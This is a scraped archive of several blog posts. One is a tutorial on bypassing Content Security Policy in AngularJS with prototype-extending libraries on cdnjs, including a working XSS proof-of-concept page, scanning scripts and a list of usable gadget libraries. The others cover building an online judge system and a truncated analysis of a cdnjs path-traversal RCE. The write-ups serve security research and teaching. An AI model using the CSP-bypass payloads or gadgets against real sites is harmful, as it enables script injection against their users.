&lt;/div> What is $on.curry.call()? You can replace it with window, and you will find that it’s not working. This is because the expression of AngularJS is scoped in a local object, and you cannot directly access window or properties on window. Another important thing is that CSP does not contain unsafe-eval, so you can’t directly do constructor.constructor(&#39;alert(1)&#39;)(). As we can see from the result, $on.curry.call() seems to be equivalent to window, why is that? This is where prototype.js comes in handy, let’s take a look at some of its source code: function curry() &#123; if (!arguments.length) return this; var __method = this, args = slice.call(arguments, 0); return function() &#123; var a = merge(args, arguments); return __method.apply(this, a); &#125; &#125; This function will be added to Function.prototype, and we can focus on the first line: if (!arguments.length) return this;, if there is no parameter, it will return this directly. In JavaScript, if you use call or apply to call a function, the first parameter can specify the value of this, if not passed it will be the default value, in non-strict mode it is window. This is why $on.curry.call() will be window, because $on is a function, so when $on.curry.call() is called without any parameters, curry function will return this, which is window, according to the conditional statement in the first line. To summarize, the reason why AngularJS needs the help of prototype.js is because prototype.js: Provides a function that added to the prototype And this function will return this The first point is very important, because as mentioned earlier, there is no way to access the window in the expression, but prototype.js puts things on the prototype, so it can be accessed through prototype. The second point is also very important. We can access window because this is window by default when calling a function via .call() without providing thisArg. After knowing how this works, you should know how to find a replacement, as long as you find one with the same function structure. I suddenly thought of an article I wrote before: Don’t break the Web: Take SmooshGate and keygen as examples, in which I mentioned that because MooTools is used to adding new things to the prototype, the method originally called flatten had to be renamed flat. Will MooTools also meet our above conditions? Manually find alternatives - MooToolsWe can find various prototypes modified by MooTools in this folder: https://github.com/mootools/mootools-core/tree/master/Source/Types Array DOMEvent Function Number Object String Because the files are not large, you can read them one by one. If you want to be faster, you can also use return this as a keyword to search, and you can find two as soon as you search: Array.implement(&#123; erase: function(item)&#123; for (var i = this.length; i--;)&#123; if (this[i] === item) this.splice(i, 1); &#125; return this; &#125;, empty: function()&#123; this.length = 0; return this; &#125;, &#125;) Both Array.prototype.erase and Array.prototype.empty functions return this, so the following two methods can get the window: [].erase.call() [].empty.call() Then try it immediately to see if the CSP bypass is successful: &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\"> &lt;title>CSP bypass - MooTools&lt;/title> &lt;meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; script-src https://cdnjs.cloudflare.com\"> &lt;/head> &lt;body> &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js\">&lt;/script> &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js\">&lt;/script> &lt;div ng-app ng-csp> &#123;&#123;[].erase.call().alert('xss')&#125;&#125; &lt;/div> &lt;/body> &lt;/html> After opening the file, the alert pop up! The bypass works. It’s time to think about how to automate it. Find the replacement in an automated wayA simple and intuitive automated process is probably: Find all libraries on cdnjs Find all JS files for each library Use a headless browser (I use puppeteer) to test whether each JS adds a new property to the prototype Try to call the new property to see if it will return window Some of the details depend on how you want to deal with it. For example, if you want to be more precisely, you can test all versions of the library, but in that case, the amount of testing may increase by five to ten times. I don’t want to spent too much time on it, so I will use the latest version only. In addition to finding a method that can return this, I also want to see which libraries will modidy your prototype, which can be known from the results of the third step. Find all libraries on cdnjsI went to the cdnjs website to see how it works, I found that it called the API in algolia to fetch the list of libraries. Algolia provides a method to pull back all the data, but the api key of the official website does not support it, and paging is limited, only returns the first 1000 results. So, I found the search API, assuming that there are no more than 1000 libraries starting with each letter, I can search for the libraries starting with each letter from a-zA-Z0-9, thereby bypassing the 1000 limitation. The implementation of the code looks like this: const axios = require('axios') const fs = require('fs'); const API_HOST = 'https://2qwlvlxzb6-dsn.algolia.net/' const SEARCH_API_URL = '/1/indexes/libraries/query' const API_KEY = '2663c73014d2e4d6d1778cc8ad9fd010' const APP_ID = '2QWLVLXZB6' const instance = axios.create(&#123; baseURL: API_HOST, headers: &#123; 'x-algolia-api-key': API_KEY, 'x-algolia-application-id': APP_ID &#125; &#125;) const sleep = ms => new Promise(resolve => setTimeout(resolve, ms)) function write(content) &#123; fs.writeFileSync('./data/libs.json', content) &#125; async function main() &#123; let chars = 'abcdefghijklmnopqrstuvwxyz0123456789'.split('') let allItems = [] let existLib = &#123;&#125; for(let char of chars) &#123; console.log(`fetching $&#123;char&#125;`) try &#123; await sleep(500) const data = await getLibraries(char) const hits = data.hits console.log('length:', hits.length) const filtered = [] for(let item of hits) &#123; if (!existLib[item.name]) &#123; filtered.push(item) &#125; existLib[item.name] = true &#125; allItems = allItems.concat(filtered) console.log('filtered length:', filtered.length) console.log('total length:', allItems.length) write(JSON.stringify(allItems, null, 2)) &#125; catch(err) &#123; console.log('Error!') console.log(err, err.toString()) &#125; &#125; &#125; async function getLibraries(keyword) &#123; const response = await instance.post(SEARCH_API_URL, &#123; params: `query=$&#123;keyword&#125;&amp;page=0&amp;hitsPerPage=1000`, restrictSearchableAttributes: [ 'name' ] &#125;) return response.data &#125; main() After running, we can get a list of all the cdnjs libraries with their names. Find all JS files for each libraryThe basic information of the library is placed in algolia, but some details are placed in cdnjs’s own API. The rules of this API are also very simple. The URL is: https://api.cdnjs.com/libraries/${package_name}/${version}, so we can get the details of every libraries. const axios = require('axios') const fs = require('fs'); const sleep = ms => new Promise(resolve => setTimeout(resolve, ms)) function write(content) &#123; fs.writeFileSync('./data/libDetail.json', content) &#125; if (!fs.existsSync('./data/libDetail.json')) &#123; write('[]') &#125; const existMap = &#123;&#125; let detailItems = JSON.parse(fs.readFileSync('./data/libDetail.json', 'utf8')) for(let item of detailItems) &#123; existMap[item.name] = true &#125; async function getDetail(libName, version) &#123; const url = `https://api.cdnjs.com/libraries/$&#123;encodeURIComponent(libName)&#125;/$&#123;version&#125;` try &#123; const response = await axios(url) return response.data &#125; catch(err) &#123; console.log(url) console.log('failed:', libName, err.message) //process.exit(1) &#125; &#125; async function getLib(libraries, lib) &#123; console.log('fetching:', lib.name) const detail = await getDetail(lib.name, lib.version) if (!detail) return detailItems.push(detail) write(JSON.stringify(detailItems, null, 2)) console.log(`progress: $&#123;detailItems.length&#125;/$&#123;libraries.length&#125;`) &#125; async function getFiles() &#123; const libraries = JSON.parse(fs.readFileSync('./data/libs.json', 'utf8')) for(let lib of libraries) &#123; if (existMap[lib.name]) continue await sleep(200) getLib(libraries, lib) &#125; &#125; async function main() &#123; getFiles() &#125; main() Find the libraries we wantThe list of packages is available, and the files for each package are also available. Moving on to our final step: finding eligible libraries. There are more than 4000 libraries on cdnjs. If we run them one by one, we must run more than 4000 times. But in fact, there should be a few that meet our conditions, so I choose to run the test for every 10 libraries. If none of these 10 libraries have changed the prototype, then the next group, if any, use a binary search to find out which libraries have changed. The HTML use for detection looks like this: &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\"> &lt;script> function getPrototypeFunctions(prototype) &#123; return Object.getOwnPropertyNames(prototype) &#125; var protos = &#123; array: getPrototypeFunctions(Array.prototype), string: getPrototypeFunctions(String.prototype), number: getPrototypeFunctions(Number.prototype), object: getPrototypeFunctions(Object.prototype), function: getPrototypeFunctions(Function.prototype) &#125; &lt;/script> &lt;/head> &lt;body> &lt;!-- insert script here --> &lt;script src=\"...\">&lt;/script> &lt;!-- insert script here --> &lt;script> var newProtos = &#123; array: getPrototypeFunctions(Array.prototype), string: getPrototypeFunctions(String.prototype), number: getPrototypeFunctions(Number.prototype), object: getPrototypeFunctions(Object.prototype), function: getPrototypeFunctions(Function.prototype) &#125; let result = &#123; prototypeFunctions: [], functionsReturnWindow: [] &#125; function check() &#123; checkPrototype('array', 'Array.prototype', Array.prototype) checkPrototype('string', 'String.prototype', String.prototype) checkPrototype('number', 'Number.prototype', Number.prototype) checkPrototype('object', 'Object.prototype', Object.prototype) checkPrototype('function', 'Function.prototype', Function.prototype) return result &#125; function checkPrototype(name, prototypeName, prototype) &#123; const oldFuncs = protos[name] const newFuncs = newProtos[name] for(let fnName of newFuncs) &#123; if (!oldFuncs.includes(fnName)) &#123; const fullName = prototypeName + '.' + fnName result.prototypeFunctions.push(fullName) try &#123; if (prototype[fnName].call() === window) &#123; result.functionsReturnWindow.push(fullName) &#125; &#125; catch(err) &#123; &#125; &#125; &#125; &#125; &lt;/script> &lt;/body> &lt;/html> Before the library is loaded, we first record the properties on each prototype. After loading the library, we record it again and compare it with the previous one to find out which properties were added after the library was introduced. Then we can also divide the results into two types, one is the method added to the prototype, and the other is the function that meets our criteria. The complete code is a bit longer, you can check it: https://github.com/aszx87410/cdnjs-prototype-pollution/blob/main/scan.js But the process is roughly: For every ten libraries, find the library that pollute the prototype After finding the library, find out which files are polluting the prototype Print out the results ResultAmong the 4290 libraries, 74 (1.72%) libraries pollute your prototype. The list is as follows: 6to5@3.6.5 Colors.js@1.2.4 Embetty@3.0.8 NicEdit@0.93 RGraph@606 ScrollTrigger@1.0.5 TableExport@5.2.0 ajv-async@1.0.1 angular-vertxbus@6.4.1 asciidoctor.js@1.5.9 aurelia-script@1.5.2 blendui@0.0.4 blissfuljs@1.0.6 bootstrap-calendar@0.2.5 carto.js@4.2.2 cignium-hypermedia-client@1.35.0 core-js@3.24.1 custombox@4.0.3 d3fc@11.0.0 d3plus@2.0.1 datejs@1.0 deb.js@0.0.2 defiant.js@2.2.7 eddy@0.7.0 ext-core@3.1.0 extjs@6.2.0 fs-tpp-api@2.4.4 highcharts@10.2.0 inheritance-js@0.4.12 jo@0.4.1 jquery-ajaxy@1.6.1 jquery-ui-bootstrap@0.5pre js-bson@2.0.8 jslite@1.1.12 json-forms@1.6.3 keras-js@0.3.0 kwargsjs@1.0.1 leaflet.freedraw@2.0.1 lobipanel@1.0.6 melonjs@1.0.1 metro@4.4.3 mo@1.7.3 monet@0.9.3 mootools@1.6.0 oidc-client@1.11.5 opal@0.3.43 prototype@1.7.3 qcobjects@2.3.69 qoopido.demand@8.0.2 qoopido.js@3.7.4 qoopido.nucleus@3.2.15 quantumui@1.2.0 rantjs@1.0.6 rita@2.8.1 rivescript@2.2.0 scriptaculous@1.9.0 should.js@13.2.3 simple-gallery-js@1.0.3 simplecartjs@3.0.5 strapdown-topbar@1.6.4 string_score@0.1.22 survey-angular@1.9.45 survey-jquery@1.9.45 survey-knockout@1.9.45 survey-react@1.9.45 survey-vue@1.9.45 tablefilter@2.5.0 tmlib.js@0.5.2 tui-editor@1.4.10 typeis@1.1.2 uppy@3.0.0 vanta@0.5.22 waud.js@1.0.3 zui@1.10.0 And of these 74 libraries, 12 (16.2%) meet our criteria, the list is as follows: [ &#123; \"url\": \"https://cdnjs.cloudflare.com/ajax/libs/asciidoctor.js/1.5.9/asciidoctor.min.js\", \"functions\": [ \"Array.prototype.$concat\", \"Array.prototype.$push\", \"Array.prototype.$append\", \"Array.prototype.$rotate!\", \"Array.prototype.$shuffle!\", \"Array.prototype.$sort\", \"Array.prototype.$to_a\", \"Array.prototype.$to_ary\", \"Array.prototype.$unshift\", \"Array.prototype.$prepend\", \"String.prototype.$initialize\", \"String.prototype.$chomp\", \"String.prototype.$force_encoding\", \"Function.prototype.$to_proc\" ] &#125;, &#123; \"url\": \"https://cdnjs.cloudflare.com/ajax/libs/jquery-ui-bootstrap/0.5pre/third-party/jQuery-UI-Date-Range-Picker/js/date.js\", \"functions\": [ \"Number.prototype.milliseconds\", \"Number.prototype.millisecond\", \"Number.prototype.seconds\", \"Number.prototype.second\", \"Number.prototype.minutes\", \"Number.prototype.minute\", \"Number.prototype.hours\", \"Number.prototype.hour\", \"Number.prototype.days\", \"Number.prototype.day\", \"Number.prototype.weeks\", \"Number.prototype.week\", \"Number.prototype.months\", \"Number.prototype.month\", \"Number.prototype.years\", \"Number.prototype.year\" ] &#125;, &#123; \"url\": \"https://cdnjs.cloudflare.com/ajax/libs/ext-core/3.1.0/ext-core.min.js\", \"functions\": [ \"Function.prototype.createInterceptor\" ] &#125;, &#123; \"url\": \"https://cdnjs.cloudflare.com/ajax/libs/datejs/1.0/date.min.js\", \"functions\": [ \"Number.prototype.milliseconds\", \"Number.prototype.millisecond\", \"Number.prototype.seconds\", \"Number.prototype.second\", \"Number.prototype.minutes\", \"Number.prototype.minute\", \"Number.prototype.hours\", \"Number.prototype.hour\", \"Number.prototype.days\", \"Number.prototype.day\", \"Number.prototype.weeks\", \"Number.prototype.week\", \"Number.prototype.months\", \"Number.prototype.month\", \"Number.prototype.years\", \"Number.prototype.year\" ] &#125;, &#123; \"url\": \"https://cdnjs.cloudflare.com/ajax/libs/json-forms/1.6.3/js/brutusin-json-forms.min.js\", \"functions\": [ \"String.prototype.format\" ] &#125;, &#123; \"url\": \"https://cdnjs.cloudflare.com/ajax/libs/inheritance-js/0.4.12/inheritance.min.js\", \"functions\": [ \"Object.prototype.mix\", \"Object.prototype.mixDeep\" ] &#125;, &#123; \"url\": \"https://cdnjs.cloudflare.com/ajax/libs/melonjs/1.0.1/melonjs.min.js\", \"functions\": [ \"Array.prototype.remove\" ] &#125;, &#123; \"url\": \"https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core-compat.min.js\", \"functions\": [ \"Array.prototype.erase\", \"Array.prototype.empty\", \"Function.prototype.extend\", \"Function.prototype.implement\", \"Function.prototype.hide\", \"Function.prototype.protect\" ] &#125;, &#123; \"url\": \"https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js\", \"functions\": [ \"Array.prototype.erase\", \"Array.prototype.empty\", \"Function.prototype.extend\", \"Function.prototype.implement\", \"Function.prototype.hide\", \"Function.prototype.protect\" ] &#125;, &#123; \"url\": \"https://cdnjs.cloudflare.com/ajax/libs/opal/0.3.43/opal.min.js\", \"functions\": [ \"Array.prototype.$extend\", \"Array.prototype.$to_proc\", \"Array.prototype.$to_a\", \"Array.prototype.$collect!\", \"Array.prototype.$delete_if\", \"Array.prototype.$each_index\", \"Array.prototype.$fill\", \"Array.prototype.$insert\", \"Array.prototype.$keep_if\", \"Array.prototype.$map!\", \"Array.prototype.$push\", \"Array.prototype.$shuffle\", \"Array.prototype.$to_ary\", \"Array.prototype.$unshift\", \"String.prototype.$as_json\", \"String.prototype.$extend\", \"String.prototype.$intern\", \"String.prototype.$to_sym\", \"Number.prototype.$as_json\", \"Number.prototype.$extend\", \"Number.prototype.$to_proc\", \"Number.prototype.$downto\", \"Number.prototype.$nonzero?\", \"Number.prototype.$ord\", \"Number.prototype.$times\", \"Function.prototype.$include\", \"Function.prototype.$module_function\", \"Function.prototype.$extend\", \"Function.prototype.$to_proc\" ] &#125;, &#123; \"url\": \"https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.min.js\", \"functions\": [ \"Array.prototype.clear\", \"Number.prototype.times\", \"Function.prototype.curry\" ] &#125;, &#123; \"url\": \"https://cdnjs.cloudflare.com/ajax/libs/tmlib.js/0.5.2/tmlib.min.js\", \"functions\": [ \"Array.prototype.swap\", \"Array.prototype.eraseAll\", \"Array.prototype.eraseIf\", \"Array.prototype.eraseIfAll\", \"Array.prototype.clear\", \"Array.prototype.shuffle\", \"Number.prototype.times\", \"Number.prototype.upto\", \"Number.prototype.downto\", \"Number.prototype.step\", \"Object.prototype.$extend\", \"Object.prototype.$safe\", \"Object.prototype.$strict\" ] &#125; ] Besides prototype.js, we have 11 other libraries that can be used. ConclusionBy grabbing all the library information on cdnjs and using the headless browser to help verify, we have successfully found 11 alternatives to prototype.js. These libraries will add new methods on the prototype, and those methods will return this after calling it. It took me a day or two to make this tiny project, because the data format is relatively simple, the verification method is also very simple, and the number is not really much. If you want to speed up, you can open a few more threads to run. By the way, finding a replacement is mostly for fun, because it doesn’t make sense for a server to block prototype.js in particular(unless it’s a XSS challenge). Anyway, even it’s not that useful, it’s still a good and fun experience to do such research. At least, we know who pollues our prototype now. Source code is available on GitHub: https://github.com/aszx87410/cdnjs-prototype-pollution","link":"/2022/09/01/en/angularjs-csp-bypass-cdnjs/"},{"title":"How to Build Your Own Online Judge System","text":"IntroductionFirst, let’s briefly introduce what an Online Judge (OJ) system is. Simply put, it is a system like LeetCode that allows you to submit code for problem-solving and then lets the system check it and give you the final result. Below is a screenshot of LeetCode: Before LeetCode became popular, the most well-known OJ was probably UVa Online Judge, also known as ACM. In Taiwan, ZeroJudge is more famous. If you happen to have a need and want to build your own OJ, what should you do? Open Source OJ SystemsA search on the internet will reveal several open-source OJ systems, among which the following three have more stars and appear to be more stable: DMOJ NOJ QDUOJ DMOJ This system appears to have the most complete and feature-rich functionality, and supports the most languages, up to 60 or so! It also supports third-party logins such as Google, Facebook, and Github. The backend is written in Python and is continuously maintained, with fairly complete documentation. The only drawback is that the interface is a bit plain and not as appealing. NOJ This system was developed by the Nanjing University of Posts and Telecommunications in China and is written in Laravel. The interface uses Material UI and looks more modern, but the documentation is less complete. QDUOJThis system was developed by Qingdao University in China. The backend is written in Python + Django, the frontend is in Vue, and it is deployed using Docker, making it simple and fast. The supported programming languages are C, C++, Java, and Python. The interface uses Ant Design. Which one to choose depends on your needs. If the documentation provided on GitHub is complete, just follow the instructions. If it is incomplete, you can ask questions through Issues. You don’t need to worry too much if you don’t speak English well, as these three repositories can be communicated in Chinese. I chose the last one, the OJ system open-sourced by Qingdao University, because I really like the interface and it is the easiest to deploy among the three. The deployment process is here: https://github.com/QingdaoU/OnlineJudgeDeploy/tree/2.0. Since it is deployed using Docker, it is really easy. Basically, just download the docker-compose.yml file and run a command to finish it. Let’s take a look at the contents of docker-compose.yml: version: &quot;3&quot; services: oj-redis: image: redis:4.0-alpine container_name: oj-redis restart: always volumes: - .&#x2F;data&#x2F;redis:&#x2F;data oj-postgres: image: postgres:10-alpine container_name: oj-postgres restart: always volumes: - .&#x2F;data&#x2F;postgres:&#x2F;var&#x2F;lib&#x2F;postgresql&#x2F;data environment: - POSTGRES_DB&#x3D;onlinejudge - POSTGRES_USER&#x3D;onlinejudge - POSTGRES_PASSWORD&#x3D;onlinejudge judge-server: image: registry.cn-hangzhou.aliyuncs.com&#x2F;onlinejudge&#x2F;judge_server container_name: judge-server restart: always read_only: true cap_drop: - SETPCAP - MKNOD - NET_BIND_SERVICE - SYS_CHROOT - SETFCAP - FSETID tmpfs: - &#x2F;tmp volumes: - .&#x2F;data&#x2F;backend&#x2F;test_case:&#x2F;test_case:ro - .&#x2F;data&#x2F;judge_server&#x2F;log:&#x2F;log - .&#x2F;data&#x2F;judge_server&#x2F;run:&#x2F;judger environment: - SERVICE_URL&#x3D;http:&#x2F;&#x2F;judge-server:8080 - BACKEND_URL&#x3D;http:&#x2F;&#x2F;oj-backend:8000&#x2F;api&#x2F;judge_server_heartbeat&#x2F; - TOKEN&#x3D;CHANGE_THIS # - judger_debug&#x3D;1 oj-backend: image: registry.cn-hangzhou.aliyuncs.com&#x2F;onlinejudge&#x2F;oj_backend container_name: oj-backend restart: always depends_on: - oj-redis - oj-postgres - judge-server volumes: - .&#x2F;data&#x2F;backend:&#x2F;data environment: - POSTGRES_DB&#x3D;onlinejudge - POSTGRES_USER&#x3D;onlinejudge - POSTGRES_PASSWORD&#x3D;onlinejudge - JUDGE_SERVER_TOKEN&#x3D;CHANGE_THIS # - FORCE_HTTPS&#x3D;1 # - STATIC_CDN_HOST&#x3D;cdn.oj.com ports: - &quot;0.0.0.0:80:8000&quot; - &quot;0.0.0.0:443:1443&quot; You can see that it is divided into four services: Redis, Postgres, judge-server, and oj-backend. However, I had one more requirement at the time, which was to support JavaScript. To achieve this goal, it was not enough to just deploy it. I also had to study how it worked. Further Study of QDUOJFirst, let’s take a look at the architecture of this system. According to the documentation on GitHub, it is divided into several modules: Backend(Django): https://github.com/QingdaoU/OnlineJudge Frontend(Vue): https://github.com/QingdaoU/OnlineJudgeFE Judger Sandbox(Seccomp): https://github.com/QingdaoU/Judger JudgeServer(A wrapper for Judger): https://github.com/QingdaoU/JudgeServer The issue that we are most concerned about (how to add a new language) has already been raised in an issue: How to add more language support, such as Ruby. It is mentioned that modifying this file is enough: https://github.com/QingdaoU/OnlineJudge/blob/master/judge/languages.py. This file is a configuration file, and you can guess what the Judge Server will do here. Here, the configuration of each language will have compile_command and command. The former is used to obtain the compilation command, and the latter is used to obtain the command to run the program. Since the input and output of this OJ are all through stdin&#x2F;stdout, when you want to add a new programming language, you just need to tell the system how to execute it. On the contrary, some OJs use functions to fill in the blanks, such as LeetCode mentioned at the beginning. At this time, if you want to add a new language, it will be more troublesome because you need to provide a function template additionally. In theory, we just need to add such settings: js_lang_config = &#123; \"run\": &#123; \"exe_name\": \"solution.js\", \"command\": \"/usr/bin/nodejs &#123;exe_path&#125;\", \"seccomp_rule\": \"general\", &#125; &#125; But if you run it like this, you will find a problem. Someone has already reported it: problem with adding js to language configs. The solution is to set seccomp_rule to None. What is seccomp? This is related to the principle of OJ! You can think carefully about the most important question in OJ: How to safely execute user-submitted code? If you don’t know what this question is asking, you can imagine the following situations: What if someone writes a code that restarts the computer? What if someone writes an infinite loop? What if someone writes a program that sends the host account password to an external server? From this, it can be seen that executing code is not that simple, and this is also the core part of OJ. The QDUOJ Judger source code is here: https://github.com/QingdaoU/Judger/tree/newnew/src. It is written in C, forks a new process, sets some rules, and then uses execve to execute the command. In the code, it can also be seen that seccomp is used to prevent the content mentioned above. In short, QDUOJ is well-layered, and the execution process is roughly as follows: Enter the front-end page made by Vue. Submit the code and call the back-end API (Python). The back-end API then calls the Judge Server API (Go). The Judge Server API calls the Judger to execute the command (C, execve + seccomp execution). So each project is responsible for its own tasks. Going back to the issue of adding JavaScript mentioned earlier, even if seccomp_rule is set to None, there will still be errors when executing JavaScript. After studying for a day or two, I found that the problem was that the memory limit of the problem was too small. I guess that Node.js will consume more memory when it is executed, so as long as the memory is increased (for example, to 1024MB), it will be solved. However, it is not over yet. There is one last problem, which is that the Node.js version on Ubuntu 16.04 is quite old, and a new version is needed to use ES6 syntax. The solution is to modify the Dockerfile of the JudgeServer and add a command to install the new version of Node.js. After all the changes are made, you can deploy your own version! Just build the docker image first, and then modify the docker-compose file that we operated at the beginning. In summary, if you don’t want to make any changes and just want to deploy, I highly recommend QDUOJ. It’s easy to deploy and has a nice interface. Writing your own OJI once tried to write my own OJ, but it was a very basic version: https://lidemy-oj.netlify.com/problems At that time, I didn’t think of using Linux commands to run it. Instead, I found the library VM2 and thought it would be useful, so I had the idea of writing this simple OJ. This simple OJ only supports JavaScript and uses the function writing method like LeetCode instead of standard input and output. I spent some time writing the prototype of the Judger: const &#123;VM&#125; = require('vm2'); const lodash = require('lodash') const RESULT_CODE = &#123; AC: 'AC', WA: 'WA', CE: 'CE', RE: 'RE', TLE: 'TLE' &#125; class Judge &#123; constructor(schema, functionCode, timeout = 3000) &#123; this.schema = schema this.functionCode = functionCode this.vm = new VM(&#123; timeout, sandbox: &#123; __equal: lodash.isEqual &#125; &#125;); &#125; t(any) &#123; return JSON.stringify(any) &#125; addWrapper(schema, code, testCase) &#123; return ` $&#123;code&#125; (() => __equal($&#123;schema.funcName&#125;.apply(null, $&#123;this.t(testCase.input)&#125;), $&#123;this.t(testCase.output)&#125;))() ` &#125; runTest(testCase) &#123; try &#123; this.vm.run(this.functionCode) &#125; catch(e) &#123; return RESULT_CODE.RE &#125; const wrapperedCode = this.addWrapper(this.schema, this.functionCode, testCase) try &#123; return this.vm.run(wrapperedCode) ? RESULT_CODE.AC: RESULT_CODE.WA &#125; catch(e) &#123; return e.message === 'Script execution timed out.' ? RESULT_CODE.TLE : RESULT_CODE.WA console.log('err', e) &#125; &#125; run() &#123; const testCases = this.schema.testCases const testResult = testCases.map(testCase => this.runTest(testCase)) const correctCount = testResult.reduce((sum, res) => sum + (res === 'AC'), 0) return &#123; score: Math.ceil(correctCount * ( 100 / testResult.length )), result: testResult &#125; &#125; &#125; const test1 = &#123; input: [1, 2], output: 3 &#125; const test2 = &#123; input: [2, 4], output: 6 &#125; const problemSchema = &#123; funcName: 'add', testCases: [test1, test2] &#125; const input = `function add(a, b)&#123; return 3 &#125;` const judge = new Judge(problemSchema, input) const result = judge.run() console.log(result) The key code is addWrapper and runTest. In addWrapper, the function code passed in is executed, and the result is compared with the output to return true or false, indicating whether the match is successful or failed, and whether the answer is correct. Then problemSchema is the format of the problem, which needs to have a funcName and testCases, and each test case has an input and output. With the above code, a super simple JS function-based Judger can be implemented. However, this Judger has many shortcomings and cannot be compared with the execution method mentioned above. Later, when I was researching, I found some good open-source solutions that can be referred to if someone wants to write their own OJ in the future. The first is the sandbox isolate open-sourced by IOI, which can safely execute commands. The second is even more amazing, it directly gives you the Judge API, and it’s free: Judge0 API. As long as you pass in the input according to its format, it will tell you the judging result, so you don’t even need to make your own Judge Server. ConclusionI wanted to build an OJ before, so I looked for a lot of information, and the biggest problem I encountered was: “I want an OJ that supports JavaScript”, because many of them don’t support it. Later, I had to write my own, which is the little toy written in JS mentioned above. Although it is still usable, many functions are incomplete, and it only supports the simplest answering. Until January of this year, I wanted to create a real OJ. I originally considered whether to write it myself, but later thought it was too troublesome and decided to find an existing one to modify and add JS support. Although I still encountered some problems, fortunately, I succeeded in the end. The final result is here: https://oj.lidemy.com/ This OJ is designed to accompany my latest free online course: [ALG101] Don’t rush to write LeetCode, which is a course for beginners. I hope to lay a solid foundation through a series of simple problems and cultivate programming thinking ability. Interested friends can take a look.","link":"/2020/03/23/en/build-your-own-online-judge-system/"},{"title":"Understanding Front-end Supply Chain Attacks and Defenses through the Vulnerability of cdnjs","text":"IntroductionA supply chain attack targets vulnerabilities upstream to launch an attack, as contaminating upstream will also contaminate downstream. Taking front-end as an example, do you realize the risks associated with using npm packages or third-party scripts imported into your code, which are called “upstream”? This article will use cdnjs as an example to show front-end supply chain attacks and defenses. cdnjsWhen writing front-end code, you often encounter many situations where you need to use third-party libraries, such as jQuery or Bootstrap (the former is downloaded 4 million times a week on npm, and the latter is downloaded 3 million times). Leaving aside the fact that most people now use webpack to package their code, in the past, for such requirements, you either downloaded a file yourself or used a ready-made CDN to load it. cdnjs is one of the sources, and its official website looks like this: In addition to cdnjs, there are other websites that provide similar services. For example, on the jQuery official website, you can see their own code.jquery.com, and Bootstrap uses another service called jsDelivr. Let’s take a practical example! Suppose I am currently working on a website that requires jQuery. I need to use the &lt;script&gt; tag to load the jQuery library into the page, and the source can be: My own website jsDelivr: https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js cdnjs: https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js jQuery official website: https://code.jquery.com/jquery-3.6.0.min.js Suppose I finally choose the URL provided by the jQuery official website, and then I will write this HTML: &lt;script src=\"https://code.jquery.com/jquery-3.6.0.min.js\">&lt;/script> In this way, the jQuery library is loaded, and other code can use the functions it provides. So why should I choose a CDN instead of downloading it and putting it on my own website? There may be several reasons: Laziness, using someone else’s is the fastest Budget considerations, using someone else’s website can save your own website’s traffic costs and load Speed considerations The third point of speed consideration is worth explaining in particular. If the loaded library comes from a CDN, the download speed may be faster. The first reason for being faster is that they are originally doing CDN, so there may be nodes in different countries. Suppose your host is in the United States. If you use your own website, Taiwanese users have to connect to the US server to fetch these libraries. However, if you use the URL provided by the CDN, you may only need to connect to the Taiwanese node, saving some latency. The second reason is that if everyone is using this CDN, the probability of it being cached will increase. For example, suppose Facebook also uses cdnjs to load jQuery 3.6.0. If my website also uses the same service to load the same library, for browsers that have visited Facebook, they do not need to download the file again because it has already been downloaded and cached. (2021-08-09 Supplement: Thanks to Ho Hong Yip for correcting me in the front-end community on Facebook after the article was published. The current browser has added a limit to the cache, that is, the cache across websites (more specifically, based on eTLD+1) will be separated. Therefore, even if Facebook has loaded jQuery 3.6.0, when users visit your website, they still need to download it again. For more detailed introduction, you can see this article: Gaining security and privacy by partitioning the cache. In this way, it seems that there is one less reason to use public CDNs? But Web Shared Libraries mentioned at the end of the article wants to solve this problem, but it seems to be in the early stage.) Taking the familiar iT 邦幫忙 website as an example, it uses resources from Google and cdnjs: We talked about the advantages of using third-party CDNs earlier, but what are the disadvantages? The first disadvantage is that if the CDN goes down, your website may go down with it, or at least experience slow connections. For example, if my website loads jQuery from cdnjs, but cdnjs suddenly becomes slow, my website will also become slow, and be affected as well. And the company behind cdnjs, Cloudflare, has indeed had some issues, affecting many websites. The second disadvantage is that if the CDN is hacked and the library you imported is injected with malicious code, your website will also be compromised. This type of attack is the topic of this article: “supply chain attack,” which infiltrates from upstream and affects downstream. Some people may think, “These big companies are unlikely to be hacked, right? And with so many people using this service, someone must be monitoring it.” Next, let’s look at a real case. Analyzing the cdnjs RCE vulnerabilityOn July 16, 2021, a security researcher @ryotkak published an article on his blog titled Remote code execution in cdnjs of Cloudflare (hereinafter referred to as “the author”). Remote code execution, or RCE for short, is a high-risk vulnerability that allows attackers to execute arbitrary code. The author discovered an RCE vulnerability in cdnjs, which, if exploited, could control the entire cdnjs service. The author’s blog post describes the process in great detail. Here, I will briefly explain how the vulnerability was formed, which involves two vulnerabilities. First, Cloudflare has open-sourced cdnjs-related code on GitHub, and one of its automatic update features caught the author’s attention. This feature automatically retrieves packaged files from npm, which are compressed files in .tgz format, and after decompressing them, processes the files and copies them to the appropriate location. The author knew that there might be vulnerabilities in using archive/tar to decompress files in Go, because the decompressed files are not processed, so the file names can look like this: ../../../../../tmp/temp. What’s the problem with this? Suppose you have a piece of code that copies files and does something like this: Concatenate the destination and file name to create the target location and create a new file. Read the original file and write it to the new file. If the destination is /packages/test and the file name is abc.js, a new file will be created at /packages/test/abc.js. If the destination is the same, but the file name is ../../../tmp/abc.js, a file will be written to /package/test/../../../tmp/abc.js, which is /tmp/abc.js. Therefore, using this technique, files can be written to any location with permissions! And cdnjs’s code has a similar vulnerability that can write files to any location. If this vulnerability can be exploited to overwrite the files that are scheduled to be automatically executed, RCE can be achieved. When the author was about to create a POC to verify this, he suddenly became curious about how the Git auto-update feature worked (the above discussion about compressed files was for npm). After researching it, the author found a piece of code for copying files related to 